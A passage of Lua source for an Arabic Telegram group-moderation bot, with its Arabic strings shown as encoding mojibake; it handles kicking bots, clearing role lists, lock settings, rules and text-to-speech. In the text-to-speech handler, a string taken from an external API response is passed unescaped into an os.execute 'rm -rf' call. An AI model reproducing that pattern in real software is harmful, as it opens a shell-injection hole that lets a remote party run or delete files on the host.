Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุชู ุญุฐู ุฌููุน ุฑุฏูุฏ ุงูุฑุชุจ", 1, 'md')
DevRio:del(Rinda.."Rio:mem:Rd"..msg.chat_id_)
DevRio:del(Rinda.."Rio:Cleaner:Rd"..msg.chat_id_)
DevRio:del(Rinda.."Rio:VipMem:Rd"..msg.chat_id_)
DevRio:del(Rinda.."Rio:Admins:Rd"..msg.chat_id_)
DevRio:del(Rinda.."Rio:Managers:Rd"..msg.chat_id_)
DevRio:del(Rinda.."Rio:Constructor:Rd"..msg.chat_id_)
DevRio:del(Rinda.."Rio:BasicConstructor:Rd"..msg.chat_id_)
DevRio:del(Rinda.."Rio:SudoBot:Rd"..msg.chat_id_)
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text == "ูุดู ุงูุจูุชุงุช" and ChCheck(msg) then 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(extra,result,success)
local admins = result.members_  
text = 'โ๏ธฐ*ูุงุฆูุฉ ุงูุจูุชุงุช* โขโฏ\n-----------------------------------------\n'
local n = 0
local t = 0
for i=0 , #admins do 
n = (n + 1)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_
},function(arg,data) 
if result.members_[i].status_.ID == "ChatMemberStatusMember" then  
ab = ''
elseif result.members_[i].status_.ID == "ChatMemberStatusEditor" then  
t = t + 1
ab = ' โฏ'
end
text = text.."~ [@"..data.username_..']'..ab.."\n"
if #admins == 0 then
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐ*ูุงุชูุฌุฏ ุจูุชุงุช ููุง*", 1, 'md')
return false end
if #admins == i then 
local a = '-----------------------------------------\nโ๏ธฐ*ุนุฏุฏ ุงูุจูุชุงุช ููุง* โข '..n..'\n'
local f = 'โ๏ธฐ*ุนุฏุฏ ุงูุจูุชุงุช ุงููุฑููุนู* โข '..t..'\nโ๏ธฐ*ููุงุญุถู ุนูุงูุฉ ุงูู*โฏ *ุชุนูู ุงู ุงูุจูุช ุงุฏูู ูู ูุฐู ุงููุฌููุนู*'
Dev_Rio(msg.chat_id_, msg.id_, 1, text..a..f, 1, 'md')
end
end,nil)
end
end,nil)
end
if text == 'ุญุฐู ุงูุจูุชุงุช' and ChCheck(msg) or text == 'ุทุฑุฏ ุงูุจูุชุงุช' and ChCheck(msg) or text == 'ูุณุญ ุงูุจูุชุงุช' and ChCheck(msg) then
tdcli_function ({ ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,dp)  
local admins = dp.members_  
local x = 0
local c = 0
for i=0 , #admins do 
if dp.members_[i].status_.ID == "ChatMemberStatusEditor" then  
x = x + 1 
end
if tonumber(admins[i].user_id_) ~= tonumber(Rinda) then
ChatKick(msg.chat_id_,admins[i].user_id_)
end
c = c + 1
end     
if (c - x) == 0 then
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐ*ูุงุชูุฌุฏ ุจูุชุงุช ููุง*", 1, 'md')
else
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐ*ุนุฏุฏ ุงูุจูุชุงุช ููุง* โข "..c.."\nโ๏ธฐ*ุนุฏุฏ ุงูุจูุชุงุช ุงููุฑููุนู* โข "..x.."\nโ๏ธฐ*ุชู ุทุฑุฏ* โข "..(c - x).." *ูู ุงูุจูุชุงุช*", 1, 'md')
end 
end,nil)  
end 
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if Admin(msg) then
if text and text:match("^ุญุฐู (.*)$") or text and text:match("^ูุณุญ (.*)$") then
local txts = {string.match(text, "^(ุญุฐู) (.*)$")}
local txtss = {string.match(text, "^(ูุณุญ) (.*)$")}
if Sudo(msg) then
if txts[2] == 'ุงูุงุณุงุณููู' or txtss[2] == 'ุงูุงุณุงุณููู' or txts[2] == 'ุงููุทูุฑูู ุงูุงุณุงุณููู' or txtss[2] == 'ุงููุทูุฑูู ุงูุงุณุงุณููู' then
DevRio:del(Rinda..'Rio:RioSudo:')
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ุญุฐู ุงููุทูุฑูู ุงูุงุณุงุณููู")  
end
end
if RioSudo(msg) then
if txts[2] == 'ุงูุซุงููููู' or txtss[2] == 'ุงูุซุงููููู' or txts[2] == 'ุงููุทูุฑูู ุงูุซุงููููู' or txtss[2] == 'ุงููุทูุฑูู ุงูุซุงููููู' then
DevRio:del(Rinda..'Rio:SecondSudo:')
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ุญุฐู ุงููุทูุฑูู ุงูุซุงููููู")  
end
end
if SecondSudo(msg) then 
if txts[2] == 'ุงููุทูุฑูู' or txtss[2] == 'ุงููุทูุฑูู' then
DevRio:del(Rinda..'Rio:SudoBot:')
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ุญุฐู ุงููุทูุฑูู")  
end
if txts[2] == 'ูุงุฆูู ุงูุนุงู' or txtss[2] == 'ูุงุฆูู ุงูุนุงู' then
DevRio:del(Rinda..'Rio:BanAll:')
DevRio:del(Rinda..'Rio:MuteAll:')
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ุญุฐู ูุงุฆูุฉ ุงูุนุงู")  
end
end
if SudoBot(msg) then
if txts[2] == 'ุงููุงูููู' or txtss[2] == 'ุงููุงูููู' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ุญุฐู ุงููุงุงูููู")  
DevRio:del(Rinda..'Rio:Owner:'..msg.chat_id_)
end
end
if SudoBot(msg) then
if txts[2] == 'ุงููุงูููู' or txtss[2] == 'ุงููุงูููู' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ุญุฐู ุงููุงุงูููู")  
DevRio:del(Rinda..'Rio:Owner:'..msg.chat_id_)
end
end
if Owner(msg) then
if txts[2] == 'ุงูููุดุฆูู ุงูุงุณุงุณููู' or txtss[2] == 'ุงูููุดุฆูู ุงูุงุณุงุณููู' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ุญุฐู ุงูููุดุฆูู ุงูุงุณุงุณููู")  
DevRio:del(Rinda..'Rio:BasicConstructor:'..msg.chat_id_)
end
end
if BasicConstructor(msg) then
if txts[2] == 'ุงูููุดุฆูู' or txtss[2] == 'ุงูููุดุฆูู' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ุญุฐู ุงูููุดุฆูู")  
DevRio:del(Rinda..'Rio:Constructor:'..msg.chat_id_)
end end
if Constructor(msg) then
if txts[2] == 'ุงููุฏุฑุงุก' or txtss[2] == 'ุงููุฏุฑุงุก' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ุญุฐู ุงููุฏุฑุงุก")  
DevRio:del(Rinda..'Rio:Managers:'..msg.chat_id_)
end 
if txts[2] == 'ุงูููุธููู' or txtss[2] == 'ุงูููุธููู' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ุญุฐู ุงูููุธููู")  
DevRio:del(Rinda..'Rio:Cleaner:'..msg.chat_id_)
end end
if Manager(msg) then
if txts[2] == 'ุงูุงุฏูููู' or txtss[2] == 'ุงูุงุฏูููู' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ุญุฐู ุงูุงุฏูููู")  
DevRio:del(Rinda..'Rio:Admins:'..msg.chat_id_)
end
end
if txts[2] == 'ููุงููู' or txtss[2] == 'ููุงููู' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ุญุฐู ุงูููุงููู")  
DevRio:del(Rinda..'Rio:rules'..msg.chat_id_)
end
if txts[2] == 'ุงููุทุงูู' or txtss[2] == 'ุงููุทุงูู' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ุญุฐู ุงููุทุงูู")  
DevRio:del(Rinda..'User:Donky:'..msg.chat_id_)
end
if txts[2] == 'ุงูุฑุงุจุท' or txtss[2] == 'ุงูุฑุงุจุท' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ุญุฐู ุฑุงุจุท ุงููุฌููุนู")  
DevRio:del(Rinda.."Rio:Groups:Links"..msg.chat_id_)
end
if txts[2] == 'ุงููููุฒูู' or txtss[2] == 'ุงููููุฒูู' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ุญุฐู ุงููููุฒูู")  
DevRio:del(Rinda..'Rio:VipMem:'..msg.chat_id_)
end
if txts[2] == 'ุงูููุชูููู' or txtss[2] == 'ุงูููุชูููู' then
DevRio:del(Rinda..'Rio:Muted:'..msg.chat_id_)
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ุญุฐู ุงูููุชูููู")  
end
if txts[2] == 'ุงููููุฏูู' or txtss[2] == 'ุงููููุฏูู' then     
local List = DevRio:smembers(Rinda..'Rio:Tkeed:'..msg.chat_id_)
for k,v in pairs(List) do   
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..v.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True") 
DevRio:srem(Rinda..'Rio:Tkeed:'..msg.chat_id_, v)
end 
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ุญุฐู ุงููููุฏูู")  
end
if txts[2] == 'ููุงุฆู ุงูููุน' or txtss[2] == 'ููุงุฆู ุงูููุน' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ุญุฐู ููุงุฆู ุงูููุน")  
DevRio:del(Rinda..'Rio:Filters:'..msg.chat_id_)
DevRio:del(Rinda.."Rio:FilterAnimation"..msg.chat_id_)
DevRio:del(Rinda.."Rio:FilterPhoto"..msg.chat_id_)
DevRio:del(Rinda.."Rio:FilterSteckr"..msg.chat_id_)
end
if txts[2] == 'ูุงุฆูู ููุน ุงููุชุญุฑูุงุช' or txtss[2] == 'ูุงุฆูู ููุน ุงููุชุญุฑูุงุช' then     
DevRio:del(Rinda.."Rio:FilterAnimation"..msg.chat_id_)
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ุญุฐู ูุงุฆูุฉ ููุน ุงููุชุญุฑูุงุช")  
end
if txts[2] == 'ูุงุฆูู ููุน ุงูุตูุฑ' or txtss[2] == 'ูุงุฆูู ููุน ุงูุตูุฑ' then     
DevRio:del(Rinda.."Rio:FilterPhoto"..msg.chat_id_)
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ุญุฐู ูุงุฆูุฉ ููุน ุงูุตูุฑ")  
end
if txts[2] == 'ูุงุฆูู ููุน ุงูููุตูุงุช' or txtss[2] == 'ูุงุฆูู ููุน ุงูููุตูุงุช' then     
DevRio:del(Rinda.."Rio:FilterSteckr"..msg.chat_id_)
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ุญุฐู ูุงุฆูุฉ ููุน ุงูููุตูุงุช")  
end
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text and text:match("^ุญุฐู ุงูููุงุฆู$") and ChCheck(msg) or text and text:match("^ูุณุญ ุงูููุงุฆู$") and ChCheck(msg) then
if not BasicConstructor(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐููููุดุฆ ุงูุงุณุงุณู ููุท', 1, 'md')
else
DevRio:del(Rinda..'Rio:Ban:'..msg.chat_id_) DevRio:del(Rinda..'Rio:Admins:'..msg.chat_id_) DevRio:del(Rinda..'User:Donky:'..msg.chat_id_) DevRio:del(Rinda..'Rio:VipMem:'..msg.chat_id_) DevRio:del(Rinda..'Rio:Filters:'..msg.chat_id_) DevRio:del(Rinda..'Rio:Muted:'..msg.chat_id_)
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุชู ุญุฐู โข โจ ูุงุฆูุฉ ุงูููุน โข ุงููุญุธูุฑูู โข ุงูููุชูููู โข ุงูุงุฏูููู โข ุงููููุฒูู โข ุงููุทุงูู โฉ ุถูุนู \n โ", 1, 'md')
end end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text and text:match("^ุญุฐู ุฌููุน ุงูุฑุชุจ$") and ChCheck(msg) or text and text:match("^ูุณุญ ุฌููุน ุงูุฑุชุจ$") and ChCheck(msg) or text and text:match("^ุชูุฒูู ุฌููุน ุงูุฑุชุจ$") and ChCheck(msg) then
if not RioConstructor(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐูููุงูููู ููุท', 1, 'md')
else
local basicconstructor = DevRio:smembers(Rinda..'Rio:BasicConstructor:'..msg.chat_id_)
local constructor = DevRio:smembers(Rinda..'Rio:Constructor:'..msg.chat_id_)
local Managers = DevRio:smembers(Rinda..'Rio:Managers:'..msg.chat_id_)
local admins = DevRio:smembers(Rinda..'Rio:Admins:'..msg.chat_id_)
local vipmem = DevRio:smembers(Rinda..'Rio:VipMem:'..msg.chat_id_)
local donky = DevRio:smembers(Rinda..'User:Donky:'..msg.chat_id_)
if #basicconstructor ~= 0 then basicconstructort = 'ุงูููุดุฆูู ุงูุงุณุงุณููู โข ' else basicconstructort = '' end
if #constructor ~= 0 then constructort = 'ุงูููุดุฆูู โข ' else constructort = '' end
if #Managers ~= 0 then Managerst = 'ุงููุฏุฑุงุก โข ' else Managerst = '' end
if #admins ~= 0 then adminst = 'ุงูุงุฏูููู โข ' else adminst = '' end
if #vipmem ~= 0 then vipmemt = 'ุงููููุฒูู โข ' else vipmemt = '' end
if #donky ~= 0 then donkyt = 'ุงููุทุงูู โข ' else donkyt = '' end
if #basicconstructor ~= 0 or #constructor ~= 0 or #Managers ~= 0 or #admins ~= 0 or #vipmem ~= 0 or #donky ~= 0 then 
DevRio:del(Rinda..'Rio:BasicConstructor:'..msg.chat_id_)
DevRio:del(Rinda..'Rio:Constructor:'..msg.chat_id_)
DevRio:del(Rinda..'Rio:Managers:'..msg.chat_id_)
DevRio:del(Rinda..'Rio:Admins:'..msg.chat_id_)
DevRio:del(Rinda..'Rio:VipMem:'..msg.chat_id_)
DevRio:del(Rinda..'User:Donky:'..msg.chat_id_)
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุชู ุญุฐู ุฌููุน ุงูุฑุชุจ ุงูุชุงููู โข โจ "..basicconstructort..constructort..Managerst..adminst..vipmemt..donkyt.." โฉ ุถูุนู \n โ", 1, 'md')
else
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐูุงุชูุฌุฏ ุฑุชุจ ููุง", 1, 'md')
end 
end 
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if Admin(msg) then 
if text and text:match("^ุงูุงุนุฏุงุฏุงุช$") and ChCheck(msg) then
if not DevRio:get(Rinda..'Rio:Spam:Text'..msg.chat_id_) then
spam_c = 400
else
spam_c = DevRio:get(Rinda..'Rio:Spam:Text'..msg.chat_id_)
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if DevRio:hget(Rinda.."Rio:Spam:Group:User"..msg.chat_id_, "Spam:User") == "kick" then     
flood = "ุจุงูุทุฑุฏ"     
elseif DevRio:hget(Rinda.."Rio:Spam:Group:User"..msg.chat_id_,"Spam:User") == "keed" then     
flood = "ุจุงูุชููุฏ"     
elseif DevRio:hget(Rinda.."Rio:Spam:Group:User"..msg.chat_id_,"Spam:User") == "mute" then     
flood = "ุจุงููุชู"           
elseif DevRio:hget(Rinda.."Rio:Spam:Group:User"..msg.chat_id_,"Spam:User") == "del" then     
flood = "ุจุงูุญุฐู"
else     
flood = "ููุชูุญ"     
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if DevRio:get(Rinda.."Rio:Lock:Bots"..msg.chat_id_) == "del" then
lock_bots = "ุจุงูุญุฐู"
elseif DevRio:get(Rinda.."Rio:Lock:Bots"..msg.chat_id_) == "ked" then
lock_bots = "ุจุงูุชููุฏ"   
elseif DevRio:get(Rinda.."Rio:Lock:Bots"..msg.chat_id_) == "kick" then
lock_bots = "ุจุงูุทุฑุฏ"    
else
lock_bots = "ููุชูุญู"    
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if DevRio:get(Rinda..'Rio:Lock:Text'..msg.chat_id_) then mute_text = 'ููููู' else mute_text = 'ููุชูุญู'end
if DevRio:get(Rinda..'Rio:Lock:Photo'..msg.chat_id_) then mute_photo = 'ููููู' else mute_photo = 'ููุชูุญู' end
if DevRio:get(Rinda..'Rio:Lock:Videos'..msg.chat_id_) then mute_video = 'ููููู' else mute_video = 'ููุชูุญู' end
if DevRio:get(Rinda..'Rio:Lock:Gifs'..msg.chat_id_) then mute_gifs = 'ููููู' else mute_gifs = 'ููุชูุญู' end
if DevRio:get(Rinda..'Rio:Lock:Music'..msg.chat_id_) then mute_music = 'ููููู' else mute_music = 'ููุชูุญู' end
if DevRio:get(Rinda..'Rio:Lock:Inline'..msg.chat_id_) then mute_in = 'ููููู' else mute_in = 'ููุชูุญู' end
if DevRio:get(Rinda..'Rio:Lock:Voice'..msg.chat_id_) then mute_voice = 'ููููู' else mute_voice = 'ููุชูุญู' end
if DevRio:get(Rinda..'Rio:Lock:EditMsgs'..msg.chat_id_) then mute_edit = 'ููููู' else mute_edit = 'ููุชูุญู' end
if DevRio:get(Rinda..'Rio:Lock:Links'..msg.chat_id_) then mute_links = 'ููููู' else mute_links = 'ููุชูุญู' end
if DevRio:get(Rinda..'Rio:Lock:Pin'..msg.chat_id_) then lock_pin = 'ููููู' else lock_pin = 'ููุชูุญู' end
if DevRio:get(Rinda..'Rio:Lock:Stickers'..msg.chat_id_) then lock_sticker = 'ููููู' else lock_sticker = 'ููุชูุญู' end
if DevRio:get(Rinda..'Rio:Lock:TagServr'..msg.chat_id_) then lock_tgservice = 'ููููู' else lock_tgservice = 'ููุชูุญู' end
if DevRio:get(Rinda..'Rio:Lock:WebLinks'..msg.chat_id_) then lock_wp = 'ููููู' else lock_wp = 'ููุชูุญู' end
if DevRio:get(Rinda..'Rio:Lock:Hashtak'..msg.chat_id_) then lock_htag = 'ููููู' else lock_htag = 'ููุชูุญู' end
if DevRio:get(Rinda..'Rio:Lock:Tags'..msg.chat_id_) then lock_tag = 'ููููู' else lock_tag = 'ููุชูุญู' end
if DevRio:get(Rinda..'Rio:Lock:Location'..msg.chat_id_) then lock_location = 'ููููู' else lock_location = 'ููุชูุญู' end
if DevRio:get(Rinda..'Rio:Lock:Contact'..msg.chat_id_) then lock_contact = 'ููููู' else lock_contact = 'ููุชูุญู' end
if DevRio:get(Rinda..'Rio:Lock:English'..msg.chat_id_) then lock_english = 'ููููู' else lock_english = 'ููุชูุญู' end
if DevRio:get(Rinda..'Rio:Lock:Arabic'..msg.chat_id_) then lock_arabic = 'ููููู' else lock_arabic = 'ููุชูุญู' end
if DevRio:get(Rinda..'Rio:Lock:Forwards'..msg.chat_id_) then lock_forward = 'ููููู' else lock_forward = 'ููุชูุญู' end
if DevRio:get(Rinda..'Rio:Lock:Document'..msg.chat_id_) then lock_file = 'ููููู' else lock_file = 'ููุชูุญู' end
if DevRio:get(Rinda..'Rio:Lock:Markdown'..msg.chat_id_) then markdown = 'ููููู' else markdown = 'ููุชูุญู' end
if DevRio:get(Rinda..'Rio:Lock:Spam'..msg.chat_id_) then lock_spam = 'ููููู' else lock_spam = 'ููุชูุญู' end
if DevRio:get(Rinda..'Rio:Lock:Join'..msg.chat_id_) then lock_Join = 'ูููู' else lock_Join = 'ููุชูุญ' end
if DevRio:get(Rinda.."Rio:Lock:Welcome"..msg.chat_id_) then send_welcome = 'ููููู' else send_welcome = 'ููุชูุญู' end
if DevRio:get(Rinda..'Rio:Lock:Fshar'..msg.chat_id_) then lock_fshar = 'ููุชูุญ' else lock_fshar = 'ูููู' end
if DevRio:get(Rinda..'Rio:Lock:Kfr'..msg.chat_id_) then lock_kaf = 'ููุชูุญ' else lock_kaf = 'ูููู' end
if DevRio:get(Rinda..'Rio:Lock:Taf'..msg.chat_id_) then lock_taf = 'ููุชูุญู' else lock_taf = 'ููููู' end
if DevRio:get(Rinda..'Rio:Lock:Farsi'..msg.chat_id_) then lock_farsi = 'ููููู' else lock_farsi = 'ููุชูุญู' end
local Flood_Num = DevRio:hget(Rinda.."Rio:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
local TXTE = "โ๏ธฐุงุนุฏุงุฏุงุช ุงููุฌููุนู โข โค\n-----------------------------------------\n"
.."โ๏ธฐุงูุฑูุงุจุท โข "..mute_links.."\n"
.."โ๏ธฐุงููุนุฑู โข "..lock_tag.."\n"
.."โ๏ธฐุงูุจูุชุงุช โข "..lock_bots.."\n"
.."โ๏ธฐุงููุชุญุฑูู โข "..mute_gifs.."\n"
.."โ๏ธฐุงูููุตูุงุช โข "..lock_sticker.."\n"
.."โ๏ธฐุงููููุงุช โข "..lock_file.."\n"
.."โ๏ธฐุงูุตูุฑ โข "..mute_photo.."\n"
.."โ๏ธฐุงูููุฏูู โข "..mute_video.."\n"
.."โ๏ธฐุงูุงูููุงูู โข "..mute_in.."\n"
.."โ๏ธฐุงูุฏุฑุฏุดู โข "..mute_text.."\n"
.."โ๏ธฐุงูุชูุฌูู โข "..lock_forward.."\n"
.."โ๏ธฐุงูุงุบุงูู โข "..mute_music.."\n"
.."โ๏ธฐุงูุตูุช โข "..mute_voice.."\n"
.."โ๏ธฐุงูุฌูุงุช โข "..lock_contact.."\n"
.."โ๏ธฐุงููุงุฑูุฏุงูู โข "..markdown.."\n"
.."โ๏ธฐุงููุงุดุชุงู โข "..lock_htag.."\n"
.."โ๏ธฐุงูุชุนุฏูู โข "..mute_edit.."\n"
.."โ๏ธฐุงูุชุซุจูุช โข "..lock_pin.."\n"
.."โ๏ธฐุงูุงุดุนุงุฑุงุช โข "..lock_tgservice.."\n"
.."โ๏ธฐุงูููุงูุด โข "..lock_spam.."\n"
.."โ๏ธฐุงูุฏุฎูู โข "..lock_Join.."\n"
.."โ๏ธฐุงูุดุจูุงุช โข "..lock_wp.."\n"
.."โ๏ธฐุงูููุงูุน โข "..lock_location.."\n"
.."โ๏ธฐุงููุดุงุฑ โข "..lock_fshar.."\n"
.."โ๏ธฐุงูููุฑ โข "..lock_kaf.."\n"
.."โ๏ธฐุงูุทุงุฆููู โข "..lock_taf.."\n"
.."โ๏ธฐุงูุนุฑุจูู โข "..lock_arabic.."\n"
.."โ๏ธฐุงูุงููููุฒูู โข "..lock_english.."\n"
.."โ๏ธฐุงููุงุฑุณูู โข "..lock_farsi.."\n"
.."โ๏ธฐุงูุชูุฑุงุฑ โข "..flood.."\n"
.."โ๏ธฐุนุฏุฏ ุงูุชูุฑุงุฑ โข "..Flood_Num.."\n"
.."โ๏ธฐุนุฏุฏ ุงูุณุจุงู โข "..spam_c.."\n"
.."-----------------------------------------\nโ๏ธฐ[โ ๐ฑ๐๐๐ฃ๐บ ๐ฒ](https://t.me/Source_Rinda)\n"
Dev_Rio(msg.chat_id_, msg.id_, 1, TXTE, 1, 'md')
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text and text:match("^ููู (.*)$") and ChCheck(msg) then
local txt = {string.match(text, "^(ููู) (.*)$")}
Dev_Rio(msg.chat_id_,0, 1, txt[2], 1, 'md')
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if text == "ุชูุนูู ุงูุทู" and Manager(msg) and ChCheck(msg) then
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชูุนู ููุฒุฉ ุงูุทู'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Rinda..'Rio:Antk:Rio'..msg.chat_id_) 
end
if text == "ุชุนุทูู ุงูุทู" and Manager(msg) and ChCheck(msg) then
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชุนุทู ููุฒุฉ ุงูุทู'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Rinda..'Rio:Antk:Rio'..msg.chat_id_,true)  
end
if text and text:match("^ุงูุทู (.*)$") and not DevRio:get(Rinda..'Rio:Antk:Rio'..msg.chat_id_) and ChCheck(msg) then
local UrlAntk = https.request('https://apiabs.ml/Antk.php?abs='..URL.escape(text:match("^ุงูุทู (.*)$")))
Antk = JSON.decode(UrlAntk)
if UrlAntk.ok ~= false then
download_to_file("https://translate"..Antk.result.google..Antk.result.code.."UTF-8"..Antk.result.utf..Antk.result.translate.."&tl=ar-IN",Antk.result.translate..'.mp3') 
sendAudio(msg.chat_id_, msg.id_, 0, 1,nil, './'..Antk.result.translate..'.mp3')  
os.execute('rm -rf ./'..Antk.result.translate..'.mp3') 
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if DevRio:get(Rinda..'Rio:setrules'..msg.chat_id_..':'..msg.sender_user_id_) then 
if text == 'ุงูุบุงุก' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุชู ุงูุบุงุก ุญูุธ ููุงููู ุงููุฌููุนู', 1, 'md')
DevRio:del(Rinda..'Rio:setrules'..msg.chat_id_..':'..msg.sender_user_id_)
return false  
end 
DevRio:del(Rinda..'Rio:setrules'..msg.chat_id_..':'..msg.sender_user_id_)
DevRio:set(Rinda..'Rio:rules'..msg.chat_id_,text)
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุชู ุญูุธ ููุงููู ุงููุฌููุนู', 1, 'md')
return false   
end
if text and text:match("^ุถุน ููุงููู$") and ChCheck(msg) or text and text:match("^ูุถุน ููุงููู$") and ChCheck(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงุฑุณู ูู ุงูููุงููู ุงูุงู', 1, 'md')
DevRio:set(Rinda..'Rio:setrules'..msg.chat_id_..':'..msg.sender_user_id_,true)
end
end
if text and text:match("^ุงูููุงููู$") and ChCheck(msg) then
local rules = DevRio:get(Rinda..'Rio:rules'..msg.chat_id_)
Dev_Rio(msg.chat_id_, msg.id_, 1, rules, 1, nil)
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text == 'ุฑููู' and ChCheck(msg) then
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(extra,result,success)
if result.phone_number_  then
MyNumber = "โ๏ธฐุฑููู โข +"..result.phone_number_
else
MyNumber = "โ๏ธฐุฑููู ููุถูุน ูุฌูุงุช ุงุชุตุงูู ููุท"
end
send(msg.chat_id_, msg.id_,MyNumber)
end,nil)
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text == "ุชูุนูู ุงูุฒุฎุฑูู" and Manager(msg) and ChCheck(msg) then
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชูุนู ุงูุฒุฎุฑูู ุถูุนู'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Rinda..'Rio:Zrf:Rio'..msg.chat_id_) 
end
if text == "ุชุนุทูู ุงูุฒุฎุฑูู" and Manager(msg) and ChCheck(msg) then
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชุนุทู ุงูุฒุฎุฑูู ุถูุนู'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Rinda..'Rio:Zrf:Rio'..msg.chat_id_,true)  
end
if DevRio:get(Rinda..'Zrf:Rio'..msg.chat_id_..msg.sender_user_id_) then 
if text and text == 'ุงูุบุงุก' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุชู ุงูุบุงุก ุงูุฑ ุงูุฒุฎุฑูู', 1, 'md')
DevRio:del(Rinda..'Zrf:Rio'..msg.chat_id_..msg.sender_user_id_)
return false  
end 
UrlZrf = https.request('https://apiabs.ml/zrf.php?abs='..URL.escape(text)) 
Zrf = JSON.decode(UrlZrf) 
t = "โ๏ธฐูุงุฆูุฉ ุงูุฒุฎุฑูู โข โค\n-----------------------------------------\n"
i = 0
for k,v in pairs(Zrf.ok) do
i = i + 1
t = t..i.."~ `"..v.."` \n"
end
Dev_Rio(msg.chat_id_, msg.id_, 1, t, 1, 'md')
DevRio:del(Rinda..'Zrf:Rio'..msg.chat_id_..msg.sender_user_id_)
return false   
end
if not DevRio:get(Rinda..'Rio:Zrf:Rio'..msg.chat_id_) then
